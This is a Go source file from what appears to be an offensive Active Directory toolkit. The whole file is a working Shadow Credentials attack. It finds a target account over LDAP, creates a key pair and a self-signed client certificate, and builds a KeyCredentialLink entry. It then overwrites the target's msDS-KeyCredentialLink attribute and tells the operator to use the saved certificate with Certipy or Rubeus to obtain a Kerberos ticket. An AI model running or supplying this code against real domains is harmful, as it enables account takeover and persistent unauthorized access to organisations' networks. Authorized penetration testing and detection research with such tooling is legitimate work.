package attacks

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"time"

	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"
	"adreaper/internal/workspace"

	ldap "github.com/go-ldap/ldap/v3"
	"github.com/google/uuid"
)

// ShadowAttack carries out the Shadow Credentials attack.
func ShadowAttack(ctx context.Context, opts *config.Options, targetSAM string) error {
	output.Info("Executing Shadow Credentials attack against: %s", targetSAM)

	ldapCl, err := recon.NewLDAPClient(opts)
	if err != nil {
		return err
	}
	defer ldapCl.Close()

	// 1. Find the target object DN
	// We'll search for the SAMAccountName provided, or with $ if it's a computer.
	filter := fmt.Sprintf("(|(sAMAccountName=%s)(sAMAccountName=%s$))", targetSAM, targetSAM)
	sr := ldap.NewSearchRequest(
		opts.BaseDN(), ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
		filter,
		[]string{"distinguishedName", "msDS-KeyCredentialLink"},
		nil,
	)
	var targetDN string
	res, err := ldapCl.SearchRaw(sr)
	if err != nil || len(res.Entries) == 0 {
		return fmt.Errorf("could not find target: %s (tried both %s and %s$)", targetSAM, targetSAM, targetSAM)
	}
	targetDN = res.Entries[0].DN

	// 2. Setup Workspace for Artifacts
	ws, _ := workspace.New(opts.WorkspaceDir, opts.Domain)
	shadowDir := filepath.Join(ws.Dir, "shadow")
	_ = os.MkdirAll(shadowDir, 0755)

	certFile := filepath.Join(shadowDir, targetSAM+".crt")
	keyFile := filepath.Join(shadowDir, targetSAM+".key")

	// 3. Generate RSA Key Pair & Self-signed Cert
	output.Info("Generating RSA Key Pair and Certificate...")
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: targetSAM,
		},
		NotBefore: time.Now().Add(-1 * time.Hour),
		NotAfter:  time.Now().AddDate(10, 0, 0),
		KeyUsage:  x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage: []x509.ExtKeyUsage{
			x509.ExtKeyUsageClientAuth,
		},
	}

	certBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, priv.Public(), priv)
	if err != nil {
		return err
	}

	outCert, _ := os.Create(certFile)
	_ = pem.Encode(outCert, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
	outCert.Close()

	outKey, _ := os.Create(keyFile)
	_ = pem.Encode(outKey, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	outKey.Close()

	// 4. Construct BCRYPT_RSAKEY_BLOB for Tag 0x01
	// Reference: [MS-ADTS] 2.2.20 & BCRYPT_RSAKEY_BLOB spec
	rsaPubKey := priv.Public().(*rsa.PublicKey)

	// Exponent as bytes (BigEndian)
	expBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(expBytes, uint32(rsaPubKey.E))
	// Standard RSA exponent 65537 is 3 bytes (01 00 01)
	expBytes = expBytes[1:] // Trim leading zero

	modBytes := rsaPubKey.N.Bytes() // BigEndian

	var bcryptBlob []byte
	// Header: Magic (RSA1), BitLength (2048), cbPublicExp (3), cbModulus (256), cbPrime1 (0), cbPrime2 (0)
	header := make([]byte, 24)
	binary.LittleEndian.PutUint32(header[0:4], 0x31415352) // "RSA1"
	binary.LittleEndian.PutUint32(header[4:8], 2048)
	binary.LittleEndian.PutUint32(header[8:12], uint32(len(expBytes)))
	binary.LittleEndian.PutUint32(header[12:16], uint32(len(modBytes)))
	binary.LittleEndian.PutUint32(header[16:20], 0) // cbPrime1
	binary.LittleEndian.PutUint32(header[20:24], 0) // cbPrime2

	bcryptBlob = append(bcryptBlob, header...)
	bcryptBlob = append(bcryptBlob, expBytes...)
	bcryptBlob = append(bcryptBlob, modBytes...)

	// 5. Construct KeyCredentialLink Entry
	keyID := sha256.Sum256(bcryptBlob)
	deviceID := uuid.New()

	var payload []byte
	payload = append(payload, 0x02, 0x00) // Version 2.0 (Classic/Compatible)

	// Tag 0x01: KeyMaterial
	payload = append(payload, 0x01)
	payload = binary.LittleEndian.AppendUint16(payload, uint16(len(bcryptBlob)))
	payload = append(payload, bcryptBlob...)

	// Tag 0x02: KeyID (SHA256 of KeyMaterial)
	payload = append(payload, 0x02)
	payload = binary.LittleEndian.AppendUint16(payload, 32)
	payload = append(payload, keyID[:]...)

	// Tag 0x03: DeviceId
	payload = append(payload, 0x03)
	payload = binary.LittleEndian.AppendUint16(payload, 16)
	payload = append(payload, deviceID[:]...)

	// Tag 0x04: KeySource (0x00)
	payload = append(payload, 0x04)
	payload = binary.LittleEndian.AppendUint16(payload, 1)
	payload = append(payload, 0x00)

	// Tag 0x05: KeyUsage (0x00)
	payload = append(payload, 0x05)
	payload = binary.LittleEndian.AppendUint16(payload, 1)
	payload = append(payload, 0x00)

	// 6. Inject into LDAP using DN-Binary Syntax
	output.Info("Injecting KeyCredential into LDAP...")

	// Format: B:<HexCharsCount>:<HexString>:<TargetDN>
	hexPayload := hex.EncodeToString(payload)
	dnBinaryVal := fmt.Sprintf("B:%d:%s:%s", len(hexPayload), hexPayload, targetDN)

	mod := ldap.NewModifyRequest(targetDN, nil)
	mod.Replace("msDS-KeyCredentialLink", []string{dnBinaryVal})

	if err := ldapCl.Modify(mod); err != nil {
		return fmt.Errorf("failed to inject shadow credentials: %w", err)
	}

	output.Success("Shadow Credentials injected successfully!")
	output.Info("  → Artifacts folder: %s", shadowDir)
	output.Info("  → Certificate:  %s", filepath.Base(certFile))
	output.Info("  → Private key: %s", filepath.Base(keyFile))
	output.Info("  → Use these for PKINIT (e.g. Certipy or Rubeus) to get a TGT.")

	return nil
}
